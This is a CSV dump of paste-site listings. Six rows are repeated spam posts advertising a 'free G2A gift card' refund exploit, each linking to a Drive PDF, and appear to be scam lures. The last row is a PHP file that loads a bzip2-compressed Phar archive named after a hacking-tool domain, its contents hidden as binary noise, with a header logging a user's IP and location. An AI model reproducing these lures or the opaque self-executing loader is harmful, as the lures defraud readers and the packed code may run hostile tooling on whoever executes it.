id,title,username,language,date,content
mEz2diyf,💰G2A.com Free Gift Card Guide 2024 May💰,sayid83,Python,Thursday 30th of May 2024 12:38:22 AM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_6683373.pdf

Working as of:

29 May 2024"
XyzBEedY,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Thursday 30th of May 2024 12:05:04 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_907604.pdf

Working as of:
30 May 2024"
pnviBEhU,🤑G2A.com Free Gift Card Guide 2024 May💰,Alfonso1119,Python,Wednesday 29th of May 2024 11:55:46 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_6683373.pdf

Working as of:

29 May 2024"
y95bUDwQ,💸G2A.com Free Gift Card Guide 2024 May🚀,Garoam,Python,Wednesday 29th of May 2024 11:49:43 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_6683373.pdf

Working as of:

29 May 2024"
qN4Skmtw,🎉G2A.com Free Gift Card Guide 2024 May🚀,atakan1983,Python,Wednesday 29th of May 2024 11:43:38 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_6683373.pdf

Working as of:

29 May 2024"
S6EZDd67,💰G2A.com Free Gift Card Guide 2024 May💰,pestinha,Python,Wednesday 29th of May 2024 11:31:25 PM CDT,"G2A.com free GC & Games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most updated version of the script. Any other posted will not work!

PDF guide:
https://drive.google.com/file/d/1fu-L9saEYF3p8c22aD4kJyaloZDzbZfJ/view?usp=g2a_refund_guide_6683373.pdf

Working as of:

29 May 2024"
f6aQh5Jj,script,GoogleHijrah,PHP,Wednesday 29th of May 2024 11:05:39 PM CDT,"<?php
/***
Date		:	2022-01-13 Thursday 23:07:33
Ipaddress		:	182.1.76.243
City		:	Gili Trawangan
Country		:	ID
Region		:	Indonesia
Organization		:	PT. Telekomunikasi Selular
User-Agent		:	Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
***/
if(!class_exists('Phar')){exit('please install php-phar');}Phar::mapPhar();require_once'phar://'.__FILE__.'/tool.eddiekidiw.com';__HALT_COMPILER(); ?>
P�������������������.phar�������tool.eddiekidiw.com�`��GN�au[����!������BZh41AY&SY�����������������������������������������:{��������z��zWvﭷ���>�[��bں��������s�}�|��˾���[w�nEZ^�m�ww�_w���{��S���^��=u�c]}��{�}����7�mo����n�O���׶�{:�z����Z�}^�7���{��n�ǻ�׷��w��w�����7{�׻����{�}��{�����s��{�m{nS׷��H)�0&i0L	�4�di�ѩ�D��i���&h�#�#jx&bi�	���LM2bhژ24��b2
�ɥ��#��M0�ɀF	�1m�Lf�`&�=�a210�h�#&��?&�da	�j�D�h�2`L�S�FM26�	�`�	����ɲ&i�4�4�
�i��E6�0���1�z!�=&�0�&�2M&i0�􆙠��h4���4d�cFL�2&�4�i4`�di��)�4�����A���cSM0	�L�L*$�T��0	�
1&�A=2`��&���Lɣ&C�?T�	��Od�ji�0���i��LM�i�C)�ba���h�*~Ҟ�I���	�L��&	�A��='��ɦ���OF�Lj��
O �&���M40L���3)����h�S�z��h���
&Ȩ�I%�pZ!J�z}����
�л���TA�*}���C��!P�}����'�RQ��XB����IUM�dl��;����}�r�6���k���~�����qWZ�A|�!��'
	w3(R��'�#�u.N��i�/�!�0BZK��n���o��!M�y��&;Ӑ�U&E(E�Hܫ�yy��n��O���	,մI�ܖ���m�s���<�S���0L��>""��its2&B��D9
�OdW��ed�:�v1ݢ���""a��X]�z�@�^DN�M���S�����~s�yK�B%�:_�{��S7��ݻs�Ams(?��Ҏ��A|��Ɨ�!��NV��_�G��S�#q>��1��m�=?��r��X)+�2��.:��-C%6u�_Z��JEWi��""��w/�f��⺣�1��ḧ́eȣ�I�;$�͑�C<;E��2l���~�[!�&,Q$��ol�Q3�7���D�%{mO���+4?����o�تk-䩵E�2�.2�v�t�s0�����9��[��K.��
���uK9�����`�O�������[�Wu.��FTL���Y�C�1/I��xqwЧ�kp�G�k(R�����b
rEJ^r���&x\��7�*65��1���=����1�F�2��*�<VL+#�oW:�a�@����?�rR�-)~��!��
���	?�k��u���D������#�����<��SJ��%��{S��������;>�N*��S?D�o�G�BY�˯		����{Q�J �2�6çE��s��8'G���+��2����3B^;�<S��X2��PkҬgX�~�q������e�0��Ď�6B((���� ��|�V�����.w��v��T�9l�c��n	��%�,��d3g�ZŦ��h!^\����-��N��G����.�|��XvH�� ��������Y����%��Dm�C��WW��A�,z�dM����}F�&cN�Z\6�ii����;�mÁ۞uD1�kPi�@��󃴞kgv{l<�|l�{M�E�=@�O�ߏ��G����+s�u��d���mo��*��ou���%���0Y�J��V�.�D��M���jX�w�ˑ���gJ��ϟ|�f�s�z�����&������%�,%e��@���A""�VD�8A�R�]�dd,�GD����]CkV$G%oE�ҝқ���m)�`�^��~���P�n��2����x�]�m""�/u��S@Ղ�i}���8���.У��w,��<��&��.��e<p�2�S��엡�����Mŕ����*��/�d��W�w:H�SJ]���2�v�L?�X��<%r��q�7�1��0`��Y�i뗞�k�R��Jԉ�f�5����1_�K,#�z�eq
d��j�4~:া$�t5$�w�$��g�i�y��$��=qԴ%�f6m�hd[�
��{U�;�I��
�,k\�w���/���S�4�pqN��T�S��9�_����q{!�o���츟�+����FS�ZcK�OY<�01H-j�`��2/""�֯A��&�Oauh���]���;ؚɟX�ܿy��� �'R�Ķ�F�d3�N�c�.�@P5?���<(�~��0|a���W�2(��WWP�9d}ɲ�\��x�b!�*K�� 'Qkv~֮��A,}�w�?S��k	��VD�8�
���u��-�(���-�U&��_������X���7'��-{�5�
	��hO�RG���ސ�rR/�e�x|.�?*��j��]?�D�h߯P|�.z��&��:��_��3���^͞����{x|�t�&���pؚ{�}�rs�kz_���qCs��o�
z#��M;�.��R%������QC����I1|ˤ�sOa�Uǎ���SH}�2���A�9[jj�*����-�Q>W2
�,E������jQ�
�a�/��H������r�4Ѹ��%K���9��g�`�$����
X�J�$`�t;�,��#��ɇ�T���^�""�E�6�7G��R��S}ij�$��v[��M�f���%�r_�����MbA
�{�z�2�m�_���z]�RhH1VSϽ�*��@���Muk,�o��~ëSh��Y�a�����uk�i��7���00|	[""�u�3�*�۷��O4��3K1�ken��eX�o���p�=><H���w*c��\-�cx��d0b 4C�5��/�!	�p9�ߴ?��G�/9�q2����1��U(���12����_�L>^���qx>��+���e=�""������dJ��S��""�""��z
/��z�E������U���%J ����I�y�®^5A颶s �0��3[�96{O��	s��1�m�bPR��u��Dѝ����C'WL�ba�������ܯ�m��ީҽ;���>""y$��J��+w��Y�F�d-i�4s����Y�^T'�.ga!!W��GC`2��kj˯v��Y~cQ�����Ї��)��,�:�}�Nl��$��K�=`;?��9��;�hVD0��A�6k�#�WyԾ�$xϞ
��s|��a�����TO[k¼�\�	��c��CIP�1��F��`E?�1& ((.2?a{�y�Φ�G�Gx�ĭ�=��Ziƻ.��>'����Tɲ�M���Љ�9M��)]��[V��Ûp����6��-i�9e\�lc��[T��i`z`?��Hݾ�.���v<'��f+���k��cU�Ʃ]�DgŤ.�$[v>��A�z��jb�`�k�:q�ؼ9Ԛ�Y^a�O�]x��X���4�\k&	�ye�>`8���3�<�Z樛����kG�$t`Pg׆_�nUz�q��hj�]�X��R���Dn�(�b%��d�>�E�F�bݷ贈/�9����մx�UWd����N��ԃ��h�#��k�����=t5?O.���6�^�c���هٕ���o*O'okղ��8��ZB�8g�h�B��Q��p�����p�""�J��J�l���iF��@�@TPze��H�$JH`��d7e4�6�Th��2�H���TRC���)N�1AR�4����G�D�-�D���.�z""}0ê��9I�F<��&(#S�:�ú3Ax���1""Z*
��u�N=24wi�'*�H�=B3�#A1�[��J�c��Yt����8/ޜX�	������Ɵ0�)ۭԘ�� $oN��_
����+����Q�dk'4��[3pX�2�EV����1c�7�&{ijTߋ�G6R�I�С�79�9I��~��a�����2[�oNJӛN���S���X�٦�_(J���!""��""^<��2oi�6��O��=��_2�q�Q��Fj��)��a1e4�`)��(4˲�R�;��z���\��~��;-�<2�P�?�`)�"" PC�D�ϫ �0�MH
�PG�]2�(0�<R^ɇ�Ȁc�t
���1(��Kx	��a��@��S 㱻�E�؇J*D�Ց:+�U_o/׌s &���<���!A�]�Zl#6&aX&�*�uN�F�^G��,F�����B
L��`�""�Th7�4�b�W@�0_^�P��(V�WM���<��s��$9ā�\�ڏEz�'ں��F'�1ql{��`z�4����m��6��,����S\���V�M�eǞ�#��,�0-)/?h&N��E��v.C��@pyFD��S�yt�����*�r�
���lJ�{��+���Y�69?��yi�zcj69�дh��?S\���~�q�V��*Ѷ��U4� Kk�IN�O?���o��Ѧ���C q,dIQ羱��ɂ ���qP{/ǽO;Q���Ȱ�s+���Wx��=""(O�}�@`U4���vr��=T.XG_���~�>�%�y@ ��F�s�ͻ����FR��F�J�bT��N���a��[΅�]6k�ǓCQ�����2�Lİd0r�@^|.�Kr$��u3�)8��_�V���T�GI?�q��M�IFe�ߒ�]ʆ\���H��܉��Dt�d+ץI�D�Hy)[��fiJkv�_�
��	6�����ah|td��~����X	� �x~�gXg��yǢ�a����9#��;�/$�����ۉ:S�����z��+@�qy�Y""�Ys���d�o����e}j�[^�dVD�n\���'&���5�E�6�=�;&Z޶耷$���L�2[vk��Pڴ0�j���|��i�z��K�!'����;�?�m�O�[^Z'�-$�b�*w��E|��\(�+��Tʆ�ɚ=I��/��x�[��m��z±���ihH7��*G���h.�1�;��W���EX�X�n�v�B~ؕ$��E�s�Y3�Q�I�����L��T��T�i��e5:3>�����}v*��0?%����I��.�Ӈu�@�Hࠜ5�$m���ؼ�r�_�����3m�ҭ�?���y	/lgTX�Q��lw@`I�N�`�k�j�F5C_�DwZ�p+u���j�tF	iף�ՙ��c&>S/��1��\�y�Xv`;Ԉkeډ��;��k B�k4�>���o4_UO9���{��k�t��o�b�N���š�eT�$�aߘ���ńO��IH2�UҦ��q�QdDcJ�)�
~P*���<v�����y���_}�s�i��sT�< ��x�J����0a���6��$�vu���F��N�6�.��/�0��AP�L�s�)�YQ^ڏ+o�q�Y�u~��Pw���e�HJ��i�s�E�%/b�rT���/�؆��Ղ�(n�ᱲc
xԥ9�<�Y=߁��g;`�E��;�'��F�?�y�F������dwJS���7�?���Q�gw�e�
�{rb<�P8 `J��[�d)�e��v�s��SA	lyj5co�bs������!�a�4Rǻo|&�%�Qp�:
�b,����$+c��h�3V��8��I��v�	ǰ#���-E|Ko�E@%���C��2XS��D8�ͨ��F|?�1�
������Cx�R�RiH
��M�0U
����#ia�s�gϽ����h(Y�����;<�(�'��3�uZ�>V��K$�޲�k��O#�Y�m������t��A��=��'��b�y}�9��#����#���7���E����Z�uL�fۢ�ƞ�O��sk�0CkG���/C���}��������!j�kZۇ�*����
�4�z�S#�sڵ\;�!0b[���|x3���t�eG��`�/�=Q�\�E=�w=a���Ys�Kz�I���EZ�̺[1�i�8\.舿4!�p=���`""�E3���=s$}�dޤ���um� �}(��v�|3��M&!RF����K�'����e��A���T����D�C�u�8r�V�1���لР2���_�4ҊⓚR^�Nh�bL'����#c�q�r}�}������k��ⳜǇfݚ'���z.;�/-�5=�~e
E
�B��Q��Mz�v=�kry(�l��/~�6+-�{�C����M'�i�sxs&%�̥]D�E�9df���B�5
��<3Ӹ���'��'=����ٸe�\
���H�^}��N�Z/zT��4��)��l��h��܊���ۈ�H�3����a�d�[sDī�|�BI�����N��D
5���;zB,@樑g�a�v5K�evh�t���cZ1�����'��.������f����O�^��(�~���ԭʦ?u��X����,%�v�:���W�
�oHZK_�>/�������)��������e6����>\���ipn��K�K�{�d�GX����rԥ� O7�����1���@��g�!��'�ޠAQ��gj��M5�����uU�����-̐
6��[���6Oq�t, �r��\
�oL^v��얉�{<�8GWI�[�S��kV����v��s���w�P���2Q�`�yK.�ɥ�bmX�r���]u�:�L�bW�H�3?�;O�Ѯ~ĝ+V�Ψ�5=�����j�1'9�iB���knk6_��hRS$*i�2���k*E�y���/�����ढ़�K�aB��!��\��9`���:=0�B��6�7�,%""�n
�����`�;���#b�$P�UrM�!�|�%?>$�M�%V*q�DF.���&��*e	Q�l>���^��ٿ2{�M62�u�s��S�C��햢��N`��|�V*�;��}p�:�l1o����A�}G���
���u��q=U�Y2�6���θ:�&Lz�r�Rf���f>�`i��#����.��mb��x_7S��l��$����9%��HT���/�U��]��4e�0""&-��ЛCU���ci]�5���P���G`�K��[Ѯ��)^�wꋍ��,��\/����r7��� ?�c�ה�8""�=q�K�C�9N��a3��2bC��簄Pt�[z��[�{ٞq�lBj�M��E�����%}	,��+f�ZG��A[X5ʦ���L�æze��.o3�N�����7�{�y*3�}���峋:�+>�xγN�ڝ9���W�z������\�0�N#4;�-N;��1�Gb�����t��R?r4^!��!���G�kJ�=�N�iM�t�.RRT��u3�*��
�~{ӓ�Nu�ce;�վtm���iZ+αT��� ��)U���柒�oH���Q��\M�G��j����9�a�9�B{K�_�sN���sO�Tǯ|�F�'���#��R�; ��4
5�r���؇W�Z�zXg��d/֠r�F��=���p���t~���ٵ�M۾:�#s��R�k���zX��a�+`7�1��^�s]v�<��QT
oĎ�-{��<3E�n/'�֭i,8˘�/�C�hSP�S��i>�^纑ޖ_�K���CDg��A/�P���
�V^C���Ay�W��$�n�~
\O� w�/e����Fu@��8`��i����/luZ�{dz��Gɻ{�]̊���G����eo�
��sd�U�~F��ٓ)�z��_����Q�!�W��@�h�u`̶vy����������*`���#w~K������ �r7~m�Z6V��5V���n���<��,Ò���LpA�Ò��t�ڡ\:��G(��9GG�
�!��u�zn-oi����G�j��7<�>趉���ީ�+6E�������<��nyS�}Lޠ̅<�)����Ӥ�R�;��\����uȱ2CHG�9�2���YQ��b�굤�Q�PJ���7ε��!AK�Se��ga�zn��%f-��)�	(�l.��FДwS{
�S�/�X���/����ŷ�����䍊+~gC�}*��%#�e'��Lg{Y�{.��� S�HOq#�Ŋ���G>�ՓUy�$AE�0�]��^
��nΟ�VIgr)��I���&9�ۨzׂ�*t�fi�Y��\���c���F'
�=_�=v�G�!
�z}������3��btn7]�/e���k+V�*�����#�_*)�Q��<7	�(�Z��@��T��z;T��2����u5�(v���@��aw�������,���z��~+q���������v�>Eb�b�ګ��x巷��uY?�ű��v�hی�Q��s�]��Č�Jv��~�ý�ޏ����yI	g&+�l�-|��52�'��'F�����Kk�AX
�A�߇`��K��A�qn��-l1����,���}��ߔ�vqRN�+{�q��r��r�ɲ�B�O��Y�/m
��劜��|�Y2��� �XѦ5�~E�7��""�&Ҭ6��*�K�a�<��%q'�""�j�a���B����R���#�� ""�E��n@��}�	�ֽ�!}��[���b��v|XK���lEr�FW.l����2M�τ�z�=哭��c�ɵ�a�b�����OG(��&X�б�D�2�#Ȕ��潡T����Zg.b~k�}���8�Z�GSe�a�ӷ��<^�L}M������^
�񗞶9[�`� �}%�|��0�J�$Ta�M/^�D��v�w�s��Q�d'�6��ocG��-K���y���%�L7a�}hl+(~|5����>��1�@F�@��^������>���������r�(9X�u֠U!�|���6�5��iz)����\%��U@?:u�>��6������r���G@�	=�zw�""�ݾ�y�X���~]����q����rE駙��ߞ��E���
�������X5Eٶg""a��	���{�ub��?���j�����۟�p�[}���o�Xt�r6�u�n�S�˕����N�
����^�G/^l��W���m�)R䑚��J��|�Pq?�iv�1���{o|�@1�Z���ѯ�c���ffZ�˪F�������Ƿ�bx R��;�q����P/o�c1w�uJ���+(?�A7�ɕoV���č�-�t�ͫ�~��2MI[.u�F�hQ�*��@#��x���u���7�`�6��l(2��� �^`��@�M�TM�)UX�ʇ�X
��k��Y���o��W�9�7�,@<���q��9��s�ʎ�r�9�<���Π5���#mq5t��7��e�<���O�Y|��`
�jl҈ĎP�˘�<�e'��*���kNWĝ+|�$Y�(7����|�~��R^�W�S����@����0;0���]��XIgd���|�j�,_	G���;��NY�6�BĤr&zI�vX��cƥ��?�ё��D�A���q��`7$\n_�(��(�h�Y�ݨzybɾb��x� r;Dc�,�E""os��ޏhlطY����L}۲��D�O*W��%&>wR;l�L0�[������
'Ԗo�e�� ���G�l���l%�B�T$4�OE��&>�汳I
C�*��^Ô���P(��S_�v��*�����dA������8+=N���Ce�=*��s
Ab�m�s�W3���]���^�G�~�&�/^u&���˔��Ǝ����d|�]ǉ襟#7z��Cy�E~��E�W�m�B3�%�Ul0�c�T�#�Y4%��ykz$�F!l��;��aw���&*��x�36��;=�M{=Mrl�e���Fџ�Xa	`f���카;Ѵ����I�C��?���Bk���k�_�\����ݠ��@�,�R���f#�y��l��5L'�{Ga�<#�,i8��RS6=/'�;��|�u�)?p �$�W>��4���ߧ.�'��2��,�k<)�Wv �#7���
��K�~��0�>[��S'����v����;8��iu�m�s�&�iV>��MgV��peBt�>432#��m
ߖ
*����M5豅�%��|i������sl��(_�Vٔ�,�}�&�h���`ENI��W��@9��9--���준��36��rE���*
:� �����϶����u�b�1""A�x��#�p��|�\�`�ӭd.����:o���q��0sD5�>�ႛx���'39~9��bW���]�ǠI��:^z����[9&�_�+Ono��dǍN�Ϸ��98V�����8X�F��J���:`	����q�Ě��3I�8e��yg��?GE�;l6��
�kuJ�o���r�2vA�
7���j�3�O�}N�n����0�����k8�)��7��Z�܍}�+{�g4�$?Ӄ���e�Vmb�s�y��K��q:s�
m��}�@;��T���Su�m�X0b4<��#ǁ��1*]�1����5V:(c��m��1���Y��T�����$�60�� ��|��;NL���b�:v���vvНTA�5�71�(��]J3�k픦�LQ��O�����Y�;�bj\�'/�}0���k���>�)�N;a����W8�]%1O��
qaB���C�g��p�����#���f:хǦ���n�n��{̒7+W�Ӫ������a�k�U��})��lG����~�.<��N?�\��ք
Y�\�g�A��v�7��>7�)���~�vx�*���?$���+�at�&�냚�>r���L�A�tAD����M<���䑜��#)Axv�9�;���y	R��ݡ�6;h߶�O�h�^PH0:�~U���kѹ8����Lk����b�=J��k�j��mt���1����
��էo���B]��D�	�����'<N�KN�f*�H���S�Ŗ�[��������ù����J*�r��10��6Jx���bנ!}��*��!ž��C;�A��X7�ꖈS�#�^��,�6�e���WL7��<�X�j����#���5HG���]�C��=�k�`F�S��I��7�Mi��.`�2����	��X���@p�����O��2�-GG�����TW�}��6��r3��4��%tv�4j>�%��F���p��OoT2`j�&�@��
�Z�Š�)���q����AU��1��.�e0�ܚb��?�']�Ҋ7��G�'��[���r`�����|���!�\���S�у��m.��|X����ۦ���3Z� �܁	���Y!a�+�)�R8���~�J�=�P�T���d�肰�%g0��,m3-�q��8���n\�A'!��B�z���c����L�4q��\��\e(���.8��c�wY���1H�5����b-�znH�E����Eh���������L��K%��M���00V@����U]�݆a$|��MS���M�t�>t/��v��Q�=�ެ�����9���<��h��Q����ɏ���
+4�C��qīC�����LԬ�O轞�,�D����Ų���/L�(���6��30@v�;��q����H������zZ��y�}��р;�!�!J1�!H( �Mۿo�,��FU�""��Ix>X�&��+��t���LhZ�S��6�/�$��$�k`��3�1�tYUR�
�=�
�}x�k��J	����m����I���2��󤻄R[��z�JA�q#*��Tk���Uw��� U_��v�r��M#�>�:5dE�?95-�U!��b��9m���hvA�TVѐ}D�9+8��oe
>��U��j�3Ui���t���>
�;(�?Oj�7��FM�/��/Y��i.j�q�B����)#�v�^��Wq�?�U��J�#/�-��)�C�n��.��_����vzVf ���C�h����t[��CΜ�#�y�o0�X�>���^���G�u�vưS_E�;��mTu���ˬ^���N�՝�C��!ނ$qSQ��+]}�A=od��
�5g�1�O�!&��u���6�Є�`�q�DF,���Z=�#�X��	"";��ny�����ɵ��JS��G-�v��HL=V�|�����j�PjC`j윿�e]7�W&0n�U'?Ў?�g���9�׽j���]��Ŏ�:���+���BOV�5�[���Ӝ6O�m
4��Tfg�����a�ZI�!��s�A�:TW�5��g�9�;�gv)t�m�๘u%R���=�Nv9t0�H�.��[_G�pf�΅�
�]������0K���n���ܹ�Q�]G��p�MVc�=��e+���@�K��ъ��Q��qh�l�4�.
�� 0��h��C��	�t�\6�_�p�H(Rb:F�����dQQ=�}�8(�Ȏ��lL��DDI$��:B�!��	�ڗK4��Z4�I�Q�6���z�֩lj��/�-\��h��f�n�)�
�䋧��3İ�O�nGmhp�8l�yl���C(\��Y,��0Ვ@_Ķ�b]�Bݵ�l�rٷ#���1+S#'�*��ŷV�XT1l��M�Q�-��7v�����;���^���\��M�lܯ֐Z�o������2�x���,�B�����Ew?8=��-�|x$���Z��=��b��nmt�Htt;�p�Z~�xX�+���ӆb^��b<K:��
>\0�{��?��rM)|���s�Ӹ�
ެ
ޣ�j9^�J�` �t^���~�7X;&��v��%��I�C02L�|oL�Ew�5�y�V;�g���b���w���:��K�?WFS5���U8��ڒ ���BN�YNz(�hͲ2#���m�����T�����ڿ���	��01����&#I?ޑ���R$ׄ��:E��')~Z>���v��G�6'|s;��[��v_i������NhaۏĈ�)3Ⱦ2����+��t����.��P	{3:u����}�3��N1IMS�4#WQf ;�+�oM��TU��h�'K�6U�TF��Cgd\trm����T�Ԉ[o���T�T�z��X�V�u+/w~*l҃><r�D�����m�CB�#b��&so��?�
�'�S���߻�T���*�\������O�X�`�� ��e07��kK�F���:1����>����c""6�Jl�Q6�.g�`��NDn+�Q9T�\t�2e�΄����ZТ�
�	>h�hx���P�e~i���Gu��>ڇ�qՍ�0,~�8���>y�fp��׍�T���=4fp���u%���ltq�y��K��-@m7S�e�S�QE��&���(yY[�z5B��K�Έ�Z��>��C�0o�΀�Y:��GZc�RI��h��a�+iS����Ųh�4Y�i,�IU2�ox�b���䪅yW�>iav
�r5:���I7�F�����>����;xT�1�=�����]�{:���[�e�3���l@���ڕe=]��?Ǌ����g�
�L�y��X&�~�L?2/�~�`�o@���2�[����3��������K��2]9��*=ax-\M""^U��ȳ�����b����_��m�`c���[�?����c(]�M͋
5�eXa�
�5�^/Z/�7O�Y�lyGS:@-�S#kf<s�g�-xbWghO���W��c�H�wC�鏦��(ᆟ�c!ICo^6D\�ˇ��i_d\��M K����s$��<��Ж�а��[�}�k�=���:\�1�Bz��@nw�VLb��\��R�n/�@��I��a���n��Q7�g�[E\Ւ�,~��`Z�d����>���5�z۞�Rh,�I�{�j㍊���`S�l�)�;������K�Ej��o���!b�b�F��!��������ږ2u�DFz�����AQG����զ@˷@i� ����!���r}��Ƨ
�L��nO:��:�����J���DȈOf@�=��>���BЀ	��� .8�,[��-/W�.!��pi�/�[I���4b$�{���l�*^H�ؿP8���!��ڍZ���/U)<�i%$/�S�MެE�_bl*u��hW��(��P<�@16R|�����^�6}͒l<�\��tŪedA���!XM���t�`��e�-h�X��L
O�}k΢��}�@&��#�
��Zl�STՂ��s�������K��N|~��O�ψ!<�%IQٽ����2=ߜ�H<c%k��#O��:d)2�pB-R8.C˴OB���_7�F�؋��!z�V��~�m�j��=���Bocq���hS;��k>O�}��f��4m�Ǖ����f��0���%g��5��yG]��c��3#�p�4d>m��T��Bx�
d�X�i��{�>�3���Uy�ɂ��E�.�CNX���u��ǓXLm�v�Yӭ���X�w��u��V��k�(F��>Ԯ��~_�?���ֽs�ٵ��W�,h��+{Ҹ� i�>Д�9=m�Ϫ��1""��v��nG�y}��쇞�E��{�4�aN�~��Oۮ[����جH��|cF���.�ĥ~��QK?-�wQӤ�
_��K�51Z��2���On�""�z���D���k��|�n�1Nhm���+���3��o���77��2N����k�8Ty��|��;w�}nG�<اM7��5���4�g�hg'�-b�dO���#��@?<V}��;c�S�rt)���}���]���^�Ǣ���� V�򖗾kfMDY�q|���2�Ն�}\7ت2�n�������ɔ��L��V� �wVUh��a-���hj���D�k�^��,����wu�O�r��TD��}�T�jr8���Ig��;�ɴ����g֙�|����j�]�q�#y�5�leBb����]��\\�(���6�>��{b
b~��r5�""����,C5pӔv��uD��;�~��A����MC%W=V���Λϣ
�`��;�c`tH��-�Ň�i]��ex�~�M�����V
L{�z�&�V@����O<
�k_1t��U'��1]G��x�h?�.�/��V����O��Eہ�һ�""��#�L^әO&�=c �ō��<��f>�v���mӶ��=�tZbُ������`�jT��ʯ&�z�Q�'T��Vņ�)�Fs'씢�^�QՄ�X�p3rIXzW�Q���u��
�vռ����gٳ��k�AڗVuAq&�J'R�j����_y�Q�`p��^.p�C�����S���w�8<-��OW��	��ǆ�o-�(��Y�Z
n��������J�~�oɉ
1�r�C%�-�RH��I�u�?ϸ���cgvꠋ�;��w���	?2z���5+�Bw��󍅛痵,[��;�g��,m��5�dH����*J�\M%����.�l��<���s+��?/�jR�""6�u�@Ƕ� Ā��|V<nrJ3�z2ew�FS}l��_���{gܐ�8r��>a$q;��|""��9��&0����z\�*�oŰu�E��O����""��<xApHYoKW��)V/y��Rh�%��QEf�S�Zc(hŴ�����Y\�s���5�����w�KQ#O�G�)xd�2r�Da�s��Vߝ�9~!>}��:���:Zj+��Z �1��o�h��݈o��`M߼z1���i�,	�㷏�M�r��q1����d�����`¡�J/�o8�XO0i�)��[-TNy�m�Ve�h�i>�oPn#�8��+;IO�\��K1�}zcR�?��^>WۚD�.�����s�H�rj�'�3ϸ���m>����*�W�(�V����:g��x4���*�R}�R���w�}{�����o:3a���8�W
�������u�*hfx��'5�^wٯɷsy[��ZW������{V̼Ro����w��Ü�9�]�Q��õ�;�i�f�Ec�4�Xל|��R�	�N-��z����e'�5�O����]�0+<�'m��Z�a�^x���T	_w��5)��Ӹ��a����-8��2ס������=�*�z4Z'�`�7�~��w��3$���92
��F���^u�-�)&%(�r,����0�@�)i���m�}�g2J]�[���`>�:���bA����T������d.����Ϳ����������HÃlH��D(z��[K��c,��\gf]_:O��rGU8�桖�ޚ/�o�Q.�L�YL���D:QqO����/U�1^,!�窠��|�zt�h��y���M��W���#P�yӐJ8��./��YdM:���� R��9_��=�&��p�v�Or��8�GY�3��z#���@�\6N�K
��+}&��#Y��mF�""ǁҠ�-p��;�ܦ�n�0�Ș����x�%����b��3~�֘�.�d�@���RePz�׭��+tG9��_0����4�i4��ۅx�ͦ��
�T��(�Fu�Bdt^!�u��Bc��x���F>\�y;z�/bf���v2?+��""��qc��E���c�|+��]�����[���E��������c��t2{�K�SQ���LlV�
DO��m�o�����~K]���.3�8����w��)3>
��?�GB��Ɖߴ�n�a�q�*�V���<�G{�N*
��N��o�""�
}��yM��z��-A�W�����եl
ϝ�+Tjkc3��&�����<���*|�	'H3��r���݇�G�]�r�C7�n������ž���z�>S
>�2����y��a{�'�Oa��s��%�C�u�K{6""��u���܈��o6��{6J�;�Z���́�Ɇ��h�*�j���{�@��ɍq9eA�[�.#��
D�Ckv1�Wz��mi5;D��T��A'�<��XF*e����3v���g� ��p����K�迄�q�l���
���g�:�O�7��'�����4��G��h�{/ʕVd�J�{��Rd������煩ֶ�=��""�@�֔�}#
'�8xs��`�2�p���l4j�Aȴ�XyEa����V_Qe�D��ޜhyBw3S�d�Vs����N0?�=�$Rt>o�|~)�:]�M��V
�;�6�I��sFނ�@*(���W�D�v�!:C���rٝ����9��YT�F%�X��-�}�a�V��Y�cS�L��\�kۄR����PO�QLԼix+�4/|���1{A�4�G�5�=>�|���T���H!�mi�!/W#�����_�l�Y3�L\��d�=�!hbг��6F#����S��@p�	��t�i�Bqb���mS8�s�D�_E{K�
�HV�U���hS""���4h�&2��/��߿}���U�⿅�e��*��Go�����c�/��x��eo�Ts�����'ߩ4kSt��
:�q�/���!rx���Ź�q��r�(�R�h�E��1��i�4���v�2)n
�_W�ot:��O��	��g""��x�N�4��_��h� �� ��2f�7Hu�X���C�9,K���@v1l�w$��f'���>�\B����<;;�b۪ <.z;�@��EV�*����ﰊ��'}Q,�0���,�l)���$����~E�(0�_�3MOwm7�ߧ�b5E.l��i�6�= ̔�2=���-�ow>	F�k����OR����ֻ��|;��1Aw�(�3h������,p�%��uJ�'�d�?���k#��t����>d��~D�U�0F��*�P��,]�V���ލ�{h~�9j�ۨon��F�qLy�;��5�V�#��t��L�k>����6*'��|&M�+���j��ښ""S<�=�/��Eɐ,���锧�s�9�����q���Y	���p`�3@�ؓ���P㡣��N���D^��
�^��J���rՂ�_����ޢ;[?e`�m�CI:K���Y�We�7�ykEh2�42�<*��r �P�J�0t�u����_+{ӪQq��!ȜX؉{0�mS�[��])�Zsk�۬;�E_�i�?zP Ʋ�T߾Yjwաelu��y�a�+An�ഘ��^w�����
nz��Ҙ�`)yB�j>�ֺW��GOr�w�K��!�6�[�߯
�^�+<���K��ԍ��Q(�-�c�'�Qw�|Y0�OU*J��_��IN��<�7R�RL�,y/;��{�4��""(�C�NܤM��.F�~7�X�mKڽX~�!碁_�8��*��40�6�մ���zڹ
